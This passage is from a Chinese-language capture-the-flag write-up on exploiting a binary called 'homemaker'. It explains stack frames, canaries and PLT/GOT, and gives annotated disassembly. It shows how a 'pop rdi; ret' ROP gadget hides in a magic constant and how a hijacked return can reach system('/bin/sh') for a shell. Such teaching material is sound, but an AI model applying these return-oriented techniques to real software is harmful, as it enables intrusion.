  \textbf{\texttt{rsp} 在「進入函式那一刻」必須是 \texttt{16} 的倍數 +
  8}（因為 \texttt{call} 剛壓了 8 bytes 的回傳位址）。 很多 libc
  函式（含 \texttt{system}）內部會用 \texttt{movaps}，要求 16-byte
  對齊，否則會 \textbf{SIGSEGV}。這就是 §6.3「多放一個
  \texttt{ret}」的原因。
\end{enumerate}

\paragraph{3.3 常見指令}\label{ux5e38ux898bux6307ux4ee4}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
指令
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
意思
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{push\ \allowbreak{}rbp} & \texttt{rsp\ \allowbreak{}-=\ \allowbreak{}8}，把 \texttt{rbp} 的值寫到
\texttt{{[}rsp{]}} \\
\texttt{pop\ \allowbreak{}rbp} & 把 \texttt{{[}rsp{]}} 讀進
\texttt{rbp}，\texttt{rsp\ \allowbreak{}+=\ \allowbreak{}8} \\
\texttt{mov\ \allowbreak{}rbp,\allowbreak{}\ \allowbreak{}rsp} & 讓 \texttt{rbp} 指向目前堆疊頂（建立本函式的
frame） \\
\texttt{sub\ \allowbreak{}rsp,\allowbreak{}\ \allowbreak{}0x120} & 在堆疊上「開空間」給區域變數用 \\
\texttt{call\ \allowbreak{}X} & \texttt{push\ \allowbreak{}下一道指令位址} → \texttt{jmp\ \allowbreak{}X} \\
\texttt{ret} & \texttt{pop\ \allowbreak{}rip}（\textbf{ROP 的核心}） \\
\textbf{\texttt{leave}} & 等於 \texttt{mov\ \allowbreak{}rsp,\allowbreak{}\ \allowbreak{}rbp} +
\texttt{pop\ \allowbreak{}rbp}（拆掉 frame） \\
\texttt{lea\ \allowbreak{}rax,{[}rip+0xec2{]}} & 把「PC 相對位移後的位址」算進
\texttt{rax}（\textbf{PIE 程式中取字串位址的標準寫法}） \\
\texttt{mov\ \allowbreak{}{[}rbp-\allowbreak{}0x8{]},\allowbreak{}\ \allowbreak{}rax} & 寫記憶體（Intel
語法：目的地在前） \\
\texttt{endbr64} & CET 的「合法間接跳躍目標」標記，不影響資料流 \\
\end{longtable}
}

函式進場/退場的固定樣板（prologue / epilogue）：

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{;; prologue}
\BuiltInTok{push} \KeywordTok{rbp}            \CommentTok{; 保存呼叫者的 rbp}
\BuiltInTok{mov}  \KeywordTok{rbp}\OperatorTok{,} \KeywordTok{rsp}       \CommentTok{; 建立自己的 frame}
\BuiltInTok{sub}  \KeywordTok{rsp}\OperatorTok{,} \BaseNTok{0x120}     \CommentTok{; 開區域變數空間}
\BuiltInTok{mov}  \KeywordTok{rax}\OperatorTok{,} \KeywordTok{fs}\OperatorTok{:}\BaseNTok{0x28}   \CommentTok{; 放金絲雀}
\BuiltInTok{mov}  \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x8}\OperatorTok{],} \KeywordTok{rax}

\CommentTok{;; ... 函式本體 ...}

\CommentTok{;; epilogue}
\BuiltInTok{mov}  \KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x8}\OperatorTok{]}  \CommentTok{; 檢查金絲雀}
\BuiltInTok{sub}  \KeywordTok{rax}\OperatorTok{,} \KeywordTok{fs}\OperatorTok{:}\BaseNTok{0x28}
\ControlFlowTok{je}\NormalTok{   ok}
\ControlFlowTok{call}\NormalTok{ \_\_stack\_chk\_fail}
\FunctionTok{ok:} \BuiltInTok{leave}           \CommentTok{; rsp=rbp; pop rbp}
    \ControlFlowTok{ret}             \CommentTok{; pop rip  \textless{}{-}{-} 這裡就是我們要劫持的地方}
\end{Highlighting}
\end{Shaded}

\paragraph{3.4 堆疊框架（stack
frame）長相}\label{ux5806ux758aux6846ux67b6stack-frameux9577ux76f8}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
        高位址
        ┌─────────────────────────────┐
        │ 呼叫者的區域變數 ...        │
        ├─────────────────────────────┤
        │ 回傳位址 (call 壓進來的)    │ ← ret 會把這個 pop 進 rip
        ├─────────────────────────────┤
 rbp →  │ 呼叫者的 rbp (push rbp)     │
        ├─────────────────────────────┤
        │ 本函式區域變數（[rbp-0x8]…）│
        │ ...                         │
 rsp →  └─────────────────────────────┘
        低位址
\end{Verbatim}

\paragraph{3.5 PLT /
GOT（動態連結速成）}\label{plt-gotux52d5ux614bux9023ux7d50ux901fux6210}

\begin{itemize}
\tightlist
\item
  \texttt{system@plt}（本題
  \texttt{0x10c0}）是\textbf{你自己的程式裡的一段小跳板}：\texttt{jmp\ \allowbreak{}QWORD\ \allowbreak{}PTR\ \allowbreak{}{[}rip+0x2eed{]}}（跳到
  GOT）。
\item
  GOT（\texttt{0x3fb8}）裡存的是 libc \texttt{system}
  的真正位址；第一次呼叫時由 \texttt{ld.\allowbreak{}so} 填好。
\item
  Full RELRO 下載入時就全部填好且不可寫 → 我們\textbf{呼叫 PLT
  是合法且穩定的}，不需要知道 libc 版本。
\end{itemize}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{00000000000010c0 \textless{}system}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt}\OperatorTok{\textgreater{}:}
\NormalTok{    10c0: f3 }\FloatTok{0}\BaseNTok{f} \DecValTok{1}\ErrorTok{e}\NormalTok{ fa          endbr64}
\NormalTok{    10c4: f2 ff }\DecValTok{25}\NormalTok{ ed }\DecValTok{2}\ErrorTok{e} \DecValTok{00} \DecValTok{00}\NormalTok{ bnd jmp }\DataTypeTok{QWORD} \DataTypeTok{PTR} \OperatorTok{[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0x2eed}\OperatorTok{]}   \OperatorTok{\#} \DecValTok{3}\ErrorTok{fb8} \OperatorTok{\textless{}}\NormalTok{system}\FunctionTok{@}\ErrorTok{g}\NormalTok{ot}\OperatorTok{\textgreater{}}
\end{Highlighting}
\end{Shaded}

\paragraph{3.6 本題用到的 libc
函式行為}\label{ux672cux984cux7528ux5230ux7684-libc-ux51fdux5f0fux884cux70ba}

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}
  >{\raggedright\arraybackslash}p{(\linewidth - 2\tabcolsep) * \real{0.5000}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
函式
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
行為
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{read(fd,\allowbreak{}\ \allowbreak{}buf,\allowbreak{}\ \allowbreak{}n)} & 讀最多 \texttt{n}
bytes，\textbf{回傳實際讀到幾個}（0 = EOF，-1 = 錯誤）。所以「讀滿 N
bytes」必須寫迴圈（本題 \texttt{readn}）。 \\
\texttt{memcpy(dst,\allowbreak{}\ \allowbreak{}src,\allowbreak{}\ \allowbreak{}n)} & 從 \texttt{src} 複製 \texttt{n} bytes
到 \texttt{dst}，\textbf{完全不檢查邊界}（危險，但本題的 \texttt{memcpy}
反而有邊界檢查）。 \\
\texttt{write(fd,\allowbreak{}\ \allowbreak{}buf,\allowbreak{}\ \allowbreak{}n)} & 把 \texttt{n} bytes
寫出去，回傳寫出的數量。 \\
\texttt{system(cmd)} & 用 \texttt{/\allowbreak{}bin/\allowbreak{}sh\ \allowbreak{}-\allowbreak{}c\ \allowbreak{}cmd} 執行字串。若字串是
\texttt{"/\allowbreak{}bin/\allowbreak{}sh"} 就會\textbf{開一個互動 shell}（繼承
stdin/stdout，所以我們能透過 socket 下指令）。 \\
\end{longtable}
}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{4.
逐行組語解說}\label{ux9010ux884cux7d44ux8a9eux89e3ux8aaa-1}

\begin{quote}
以下都是 \texttt{objdump\ \allowbreak{}-\allowbreak{}d\ \allowbreak{}-\allowbreak{}M\ \allowbreak{}intel\ \allowbreak{}./\allowbreak{}homemaker} 的真實輸出（位址是
PIE 相對 offset）。 註解是我加的。這份清單已經涵蓋所有對解題重要的函式。
\end{quote}

\paragraph{\texorpdfstring{4.1 \texttt{checksum} @ \texttt{0x11e9}（訊框
CRC，8-bit，多項式
0x2f）}{4.1 checksum @ 0x11e9（訊框 CRC，8-bit，多項式 0x2f）}}\label{checksum-0x11e9ux8a0aux6846-crc8-bitux591aux9805ux5f0f-0x2f}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{11e9: f3 }\FloatTok{0}\BaseNTok{f} \DecValTok{1}\ErrorTok{e}\NormalTok{ fa            endbr64}
\NormalTok{11ed: 55                     }\BuiltInTok{push}   \KeywordTok{rbp}
\NormalTok{11ee: 48 89 e5               mov    }\KeywordTok{rbp}\OperatorTok{,}\KeywordTok{rsp}
\NormalTok{11f1: 48 83 ec }\DecValTok{20}\NormalTok{            sub    }\KeywordTok{rsp}\OperatorTok{,}\BaseNTok{0x20}              \CommentTok{; 開 0x20 bytes 區域變數}
\NormalTok{11f5: 48 89 7d e8            mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x18}\OperatorTok{],}\KeywordTok{rdi}        \CommentTok{; 參數1 = buf}
\NormalTok{11f9: 89 f0                  mov    }\KeywordTok{eax}\OperatorTok{,}\KeywordTok{esi}               \CommentTok{; 參數2 = len（16{-}bit，用 esi 傳）}
\NormalTok{11fb: 66 89 45 e4            mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x1c}\OperatorTok{],}\KeywordTok{ax}         \CommentTok{; 存成 WORD}
\NormalTok{11ff: 64 48 8b 04 25 28 00 00 00   }\BuiltInTok{mov} \KeywordTok{rax}\OperatorTok{,}\DataTypeTok{QWORD} \DataTypeTok{PTR} \KeywordTok{fs}\OperatorTok{:}\BaseNTok{0x28}   \CommentTok{; 讀金絲雀}
\NormalTok{1208: 48 89 45 f8            mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x8}\OperatorTok{],}\KeywordTok{rax}         \CommentTok{; 放進 [rbp{-}8]}
\NormalTok{120c: 31 c0                  }\OperatorTok{xor}    \KeywordTok{eax}\OperatorTok{,}\KeywordTok{eax}               \CommentTok{; 金絲雀放好後 eax 歸零（可省略）}
\NormalTok{120e: c6 }\DecValTok{45}\NormalTok{ f1 }\DecValTok{00}\NormalTok{            mov    }\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0xf}\OperatorTok{],}\BaseNTok{0x0} \CommentTok{; acc = 0        ← 累加器}
\NormalTok{1212: 66 c7 }\DecValTok{45}\NormalTok{ f2 }\DecValTok{00} \DecValTok{00}\NormalTok{      mov    }\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0xe}\OperatorTok{],}\BaseNTok{0x0} \CommentTok{; i = 0          ← 迴圈索引}
\NormalTok{1218: eb }\DecValTok{4}\ErrorTok{b}\NormalTok{                  jmp    }\DecValTok{1265}                  \CommentTok{; 先跳到「條件判斷」}
\NormalTok{121a: 0f b7 }\DecValTok{55}\NormalTok{ f2            movzx  }\KeywordTok{edx}\OperatorTok{,}\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0xe}\OperatorTok{]} \CommentTok{; edx = i}
\NormalTok{121e: 48 8b 45 e8            mov    }\KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x18}\OperatorTok{]}        \CommentTok{; rax = buf}
\NormalTok{1222: 48 01 d0               add    }\KeywordTok{rax}\OperatorTok{,}\KeywordTok{rdx}               \CommentTok{; rax = buf + i}
\NormalTok{1225: 0f b6 }\DecValTok{00}\NormalTok{               movzx  }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rax}\OperatorTok{]}    \CommentTok{; eax = buf[i]}
\NormalTok{1228: 30 45 f1               }\OperatorTok{xor}    \DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0xf}\OperatorTok{],}\KeywordTok{al} \CommentTok{; acc \^{}= buf[i]  ← CRC 第一步}
\NormalTok{122b: c7 }\DecValTok{45}\NormalTok{ f4 }\DecValTok{00} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{   mov    }\DataTypeTok{DWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0xc}\OperatorTok{],}\BaseNTok{0x0} \CommentTok{; j = 0}
\NormalTok{1232: eb }\DecValTok{20}\NormalTok{                  jmp    }\DecValTok{1254}
\NormalTok{1234: 0f b6 }\DecValTok{45}\NormalTok{ f1            movzx  }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0xf}\OperatorTok{]} \CommentTok{; eax = acc}
\NormalTok{1238: 84 c0                  test   }\KeywordTok{al}\OperatorTok{,}\KeywordTok{al}
\NormalTok{123a: 79 0b                  }\ControlFlowTok{jns}    \DecValTok{1247}                  \CommentTok{; 若 bit7 = 0 跳去 1247}
\NormalTok{123c: 0f b6 }\DecValTok{45}\NormalTok{ f1            movzx  }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0xf}\OperatorTok{]} \CommentTok{; （bit7 = 1 分支）}
\NormalTok{1240: 01 c0                  add    }\KeywordTok{eax}\OperatorTok{,}\KeywordTok{eax}               \CommentTok{; acc \textless{}\textless{}= 1}
\NormalTok{1242: 83 f0 }\FloatTok{2}\BaseNTok{f}               \OperatorTok{xor}    \KeywordTok{eax}\OperatorTok{,}\BaseNTok{0x2f}              \CommentTok{; acc \^{}= 0x2f   ← CRC 多項式}
\NormalTok{1245: eb }\DecValTok{06}\NormalTok{                  jmp    }\DecValTok{124}\BaseNTok{d}
\NormalTok{1247: 0f b6 }\DecValTok{45}\NormalTok{ f1            movzx  }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0xf}\OperatorTok{]}
\NormalTok{124b: 01 c0                  add    }\KeywordTok{eax}\OperatorTok{,}\KeywordTok{eax}               \CommentTok{; acc \textless{}\textless{}= 1（不做 xor）}
\NormalTok{124d: 88 45 f1               mov    }\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0xf}\OperatorTok{],}\KeywordTok{al} \CommentTok{; 寫回 acc}
\NormalTok{1250: 83 45 f4 }\DecValTok{01}\NormalTok{            add    }\DataTypeTok{DWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0xc}\OperatorTok{],}\BaseNTok{0x1} \CommentTok{; j++}
\NormalTok{1254: 83 7d f4 }\DecValTok{07}\NormalTok{            cmp    }\DataTypeTok{DWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0xc}\OperatorTok{],}\BaseNTok{0x7} \CommentTok{; j \textless{}= 7 ?}
\NormalTok{1258: 7e da                  jle    }\DecValTok{1234}                  \CommentTok{; 迴圈 8 次}
\NormalTok{125a: 0f b7 }\DecValTok{45}\NormalTok{ f2            movzx  }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0xe}\OperatorTok{]} \CommentTok{; i}
\NormalTok{125e: 83 c0 }\DecValTok{01}\NormalTok{               add    }\KeywordTok{eax}\OperatorTok{,}\BaseNTok{0x1}               \CommentTok{; i+1}
\NormalTok{1261: 66 89 45 f2            mov    }\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0xe}\OperatorTok{],}\KeywordTok{ax} \CommentTok{; i++}
\NormalTok{1265: 0f b7 }\DecValTok{45}\NormalTok{ f2            movzx  }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0xe}\OperatorTok{]}
\NormalTok{1269: 66 3b 45 e4            cmp    }\KeywordTok{ax}\OperatorTok{,}\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x1c}\OperatorTok{]} \CommentTok{; i \textless{} len ?}
\NormalTok{126d: 72 ab                  jb     }\DecValTok{121}\ErrorTok{a}                  \CommentTok{; 是就繼續}
\NormalTok{126f: 0f b6 }\DecValTok{45}\NormalTok{ f1            movzx  }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0xf}\OperatorTok{]} \CommentTok{; 回傳 acc}
\NormalTok{1273: 48 8b 55 f8            mov    }\KeywordTok{rdx}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x8}\OperatorTok{]}         \CommentTok{; 檢查金絲雀…}
\NormalTok{1280: 74 05                  }\ControlFlowTok{je}     \DecValTok{1287}
\NormalTok{1282: e8 }\DecValTok{29}\NormalTok{ fe ff ff         call   }\BaseNTok{10b}\ErrorTok{0} \OperatorTok{\textless{}}\NormalTok{\_\_stack\_chk\_fail}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt}\OperatorTok{\textgreater{}}
\NormalTok{1287: c9                     leave}
\NormalTok{1288: c3                     ret}
\end{Highlighting}
\end{Shaded}

\textbf{Python 等價實作}（\texttt{exploit.\allowbreak{}py} 裡就是這個）：

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ crc8(data):}
\NormalTok{    acc }\OperatorTok{=} \DecValTok{0}
    \ControlFlowTok{for}\NormalTok{ b }\KeywordTok{in}\NormalTok{ data:}
\NormalTok{        acc }\OperatorTok{\^{}=}\NormalTok{ b}
        \ControlFlowTok{for}\NormalTok{ \_ }\KeywordTok{in} \BuiltInTok{range}\NormalTok{(}\DecValTok{8}\NormalTok{):}
\NormalTok{            acc }\OperatorTok{=}\NormalTok{ ((acc }\OperatorTok{\textless{}\textless{}} \DecValTok{1}\NormalTok{) }\OperatorTok{\^{}} \BaseNTok{0x2f}\NormalTok{) }\OperatorTok{\&} \BaseNTok{0xff} \ControlFlowTok{if}\NormalTok{ acc }\OperatorTok{\&} \BaseNTok{0x80} \ControlFlowTok{else}\NormalTok{ (acc }\OperatorTok{\textless{}\textless{}} \DecValTok{1}\NormalTok{) }\OperatorTok{\&} \BaseNTok{0xff}
    \ControlFlowTok{return}\NormalTok{ acc}
\end{Highlighting}
\end{Shaded}

\paragraph{\texorpdfstring{4.2 \texttt{validate} @
\texttt{0x1289}（鑰匙卡魔數）------順便藏了
\texttt{pop\ \allowbreak{}rdi;\ \allowbreak{}ret}！}{4.2 validate @ 0x1289（鑰匙卡魔數）------順便藏了 pop rdi; ret！}}\label{validate-0x1289ux9470ux5319ux5361ux9b54ux6578ux9806ux4fbfux85cfux4e86-pop-rdi-ret}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{1289: f3 }\FloatTok{0}\BaseNTok{f} \DecValTok{1}\ErrorTok{e}\NormalTok{ fa            endbr64}
\NormalTok{128d: 55                     }\BuiltInTok{push}   \KeywordTok{rbp}
\NormalTok{128e: 48 89 e5               mov    }\KeywordTok{rbp}\OperatorTok{,}\KeywordTok{rsp}
\NormalTok{1291: 48 83 ec }\DecValTok{20}\NormalTok{            sub    }\KeywordTok{rsp}\OperatorTok{,}\BaseNTok{0x20}
\NormalTok{1295: 89 7d ec               mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x14}\OperatorTok{],}\KeywordTok{edi}        \CommentTok{; 參數 = magic（32{-}bit）}
\NormalTok{1298: 64 48 8b 04 25 28 00 00 00   }\BuiltInTok{mov} \KeywordTok{rax}\OperatorTok{,}\DataTypeTok{QWORD} \DataTypeTok{PTR} \KeywordTok{fs}\OperatorTok{:}\BaseNTok{0x28}
\NormalTok{12a1: 48 89 45 f8            mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x8}\OperatorTok{],}\KeywordTok{rax}         \CommentTok{; 金絲雀}
\NormalTok{12a5: 31 c0                  }\OperatorTok{xor}    \KeywordTok{eax}\OperatorTok{,}\KeywordTok{eax}
\NormalTok{12a7: 81 7d ec }\FloatTok{5}\BaseNTok{f}\NormalTok{ c3 }\DecValTok{37} \DecValTok{13}\NormalTok{   cmp    }\DataTypeTok{DWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x14}\OperatorTok{],}\BaseNTok{0x1337c35f}   \CommentTok{; ✶ 關鍵比較}
\NormalTok{12ae: 74 07                  }\ControlFlowTok{je}     \DecValTok{12}\ErrorTok{b7}                  \CommentTok{; 相等 → 回 0（成功）}
\NormalTok{12b0: b8 ff ff ff ff         mov    }\KeywordTok{eax}\OperatorTok{,}\BaseNTok{0xffffffff}        \CommentTok{; 否則回 {-}1}
\NormalTok{12b5: eb }\DecValTok{05}\NormalTok{                  jmp    }\DecValTok{12}\ErrorTok{bc}
\NormalTok{12b7: b8 }\DecValTok{00} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{         mov    }\KeywordTok{eax}\OperatorTok{,}\BaseNTok{0x0}
\NormalTok{12bc: 48 8b 55 f8            mov    }\KeywordTok{rdx}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x8}\OperatorTok{]}         \CommentTok{; 金絲雀檢查}
\NormalTok{12c0: 64 48 2b 14 25 28 00 00 00   }\BuiltInTok{sub} \KeywordTok{rdx}\OperatorTok{,}\DataTypeTok{QWORD} \DataTypeTok{PTR} \KeywordTok{fs}\OperatorTok{:}\BaseNTok{0x28}
\NormalTok{12c9: 74 05                  }\ControlFlowTok{je}     \DecValTok{12}\BaseNTok{d}\ErrorTok{0}
\NormalTok{12cb: e8 e0 fd ff ff         call   }\BaseNTok{10b}\ErrorTok{0} \OperatorTok{\textless{}}\NormalTok{\_\_stack\_chk\_fail}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt}\OperatorTok{\textgreater{}}
\NormalTok{12d0: c9                     leave}
\NormalTok{12d1: c3                     ret}
\end{Highlighting}
\end{Shaded}

★ 為什麼關鍵？看 \texttt{0x12a7} 的 7 個
byte：\texttt{81\ \allowbreak{}7d\ \allowbreak{}ec\ \allowbreak{}\textbar{}\allowbreak{}\ \allowbreak{}5f\ \allowbreak{}c3\ \allowbreak{}37\ \allowbreak{}13}。 最後 4 bytes
是立即值 \texttt{0x1337c35f}（小端序存成 \texttt{5f\ \allowbreak{}c3\ \allowbreak{}37\ \allowbreak{}13}）。
如果 \texttt{rip} 跳到
\textbf{\texttt{0x12aa}}（也就是立即值的中間），CPU 看到的是：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
5f      pop rdi
c3      ret
\end{Verbatim}

→ 我們白撿到一個 \textbf{\texttt{pop\ \allowbreak{}rdi;\ \allowbreak{}ret}
gadget}（而且是題目故意用 \texttt{0x1337c35f} 這個魔數「送」給你的）！
本題 \texttt{pop\ \allowbreak{}rdi;\ \allowbreak{}ret\ \allowbreak{}=\ \allowbreak{}PIE\_\allowbreak{}base\ \allowbreak{}+\ \allowbreak{}0x12aa}。

\begin{quote}
教學重點：\textbf{gadget 不需要對齊}。x86 是變長指令集，從任何 byte
開始解碼都合法， 所以 \texttt{ROPgadget}
會找到一大堆「未對齊」gadget。IBT 只檢查間接 \texttt{call/\allowbreak{}jmp}，不檢查
\texttt{ret}，所以可用。
\end{quote}

\paragraph{\texorpdfstring{4.3 \texttt{cmd\_\allowbreak{}echo} @
\texttt{0x12d2}（opcode 5 →
\texttt{system()}）}{4.3 cmd\_echo @ 0x12d2（opcode 5 → system()）}}\label{cmd_echo-0x12d2opcode-5-system}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{12d2: f3 }\FloatTok{0}\BaseNTok{f} \DecValTok{1}\ErrorTok{e}\NormalTok{ fa            endbr64}
\NormalTok{12d6: 55                     }\BuiltInTok{push}   \KeywordTok{rbp}
\NormalTok{12d7: 48 89 e5               mov    }\KeywordTok{rbp}\OperatorTok{,}\KeywordTok{rsp}
\NormalTok{12da: 48 83 ec }\DecValTok{10}\NormalTok{            sub    }\KeywordTok{rsp}\OperatorTok{,}\BaseNTok{0x10}
\NormalTok{12de: 64 48 8b 04 25 28 00 00 00   }\BuiltInTok{mov} \KeywordTok{rax}\OperatorTok{,}\DataTypeTok{QWORD} \DataTypeTok{PTR} \KeywordTok{fs}\OperatorTok{:}\BaseNTok{0x28}
\NormalTok{12e7: 48 89 45 f8            mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x8}\OperatorTok{],}\KeywordTok{rax}
\NormalTok{12eb: 31 c0                  }\OperatorTok{xor}    \KeywordTok{eax}\OperatorTok{,}\KeywordTok{eax}
\NormalTok{12ed: 48 8d 05 c2 }\DecValTok{0}\ErrorTok{e} \DecValTok{00} \DecValTok{00}\NormalTok{   lea    }\KeywordTok{rax}\OperatorTok{,[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0xec2}\OperatorTok{]}       \CommentTok{; → .rodata:0x21b6}
\NormalTok{12f4: 48 89 c7               mov    }\KeywordTok{rdi}\OperatorTok{,}\KeywordTok{rax}               \CommentTok{; rdi = 字串（第 1 參數）}
\NormalTok{12f7: e8 c4 fd ff ff         call   }\DecValTok{10}\ErrorTok{c0} \OperatorTok{\textless{}}\NormalTok{system}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt}\OperatorTok{\textgreater{}}     \CommentTok{; system(rdi)}
\NormalTok{12fc: 90                     }\BuiltInTok{nop}
\end{Highlighting}
\end{Shaded}

\texttt{.\allowbreak{}rodata:\allowbreak{}0x21b6} 的內容是
\texttt{"/\allowbreak{}bin/\allowbreak{}echo\ \allowbreak{}-\allowbreak{}n\ \allowbreak{}\textquotesingle{}\allowbreak{}\textquotesingle{}\allowbreak{}"}（\texttt{objdump\ \allowbreak{}-\allowbreak{}s\ \allowbreak{}-\allowbreak{}j\ \allowbreak{}.\allowbreak{}rodata}
可見
\texttt{2f\ \allowbreak{}62\ \allowbreak{}69\ \allowbreak{}6e\ \allowbreak{}2f\ \allowbreak{}65\ \allowbreak{}63\ \allowbreak{}68\ \allowbreak{}6f\ \allowbreak{}20\ \allowbreak{}2d\ \allowbreak{}6e\ \allowbreak{}20\ \allowbreak{}27\ \allowbreak{}27\ \allowbreak{}00}）。

\textbf{這裡證明：字串是固定的、完全沒有使用者輸入} → 沒有 command
injection。

\paragraph{\texorpdfstring{4.4 \texttt{readn} @ \texttt{0x1313}（讀滿 N
bytes）}{4.4 readn @ 0x1313（讀滿 N bytes）}}\label{readn-0x1313ux8b80ux6eff-n-bytes}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{1313: f3 }\FloatTok{0}\BaseNTok{f} \DecValTok{1}\ErrorTok{e}\NormalTok{ fa            endbr64}
\NormalTok{1317: 55                     }\BuiltInTok{push}   \KeywordTok{rbp}
\NormalTok{1318: 48 89 e5               mov    }\KeywordTok{rbp}\OperatorTok{,}\KeywordTok{rsp}
\NormalTok{131b: 48 83 ec }\DecValTok{30}\NormalTok{            sub    }\KeywordTok{rsp}\OperatorTok{,}\BaseNTok{0x30}
\NormalTok{131f: 48 89 7d d8            mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x28}\OperatorTok{],}\KeywordTok{rdi}        \CommentTok{; buf}
\NormalTok{1323: 48 89 75 d0            mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x30}\OperatorTok{],}\KeywordTok{rsi}        \CommentTok{; len}
\NormalTok{1327: 64 48 8b 04 25 28 00 00 00   }\BuiltInTok{mov} \KeywordTok{rax}\OperatorTok{,}\DataTypeTok{QWORD} \DataTypeTok{PTR} \KeywordTok{fs}\OperatorTok{:}\BaseNTok{0x28}
\NormalTok{1330: 48 89 45 f8            mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x8}\OperatorTok{],}\KeywordTok{rax}
